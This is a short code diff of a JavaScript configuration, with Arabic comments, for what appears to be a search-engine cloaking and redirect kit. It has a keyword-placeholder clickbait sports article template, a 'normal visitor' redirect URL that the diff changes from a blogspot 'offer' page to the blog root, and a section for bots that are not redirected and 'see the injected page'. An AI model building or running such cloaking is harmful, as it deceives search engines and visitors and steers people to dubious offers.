@@ -16,7 +16,7 @@ const CONFIG = {
   articleBody: "{K} live: {K} look to seize control of thrilling {K}. Every team in the {K} has two wins apiece as we go into the final two game weeks. {K} will host {K} at the stadium with the {K} a single point ahead of {K} in the standings.",
 
   // ---------- التحويل ----------
-  redirect: "https://yourblog.blogspot.com/2026/10/offer.html?m=gas", // وجهة الزائر العادي
+  redirect: "https://yourblog.blogspot.com", // وجهة الزائر العادي
   delayMs: 0,          // تأخير قبل التحويل بالمللي ثانية (0 = فوري)
 
   // ---------- البوتات اللي منحولهاش (تشوف الصفحة المحقونة) ----------
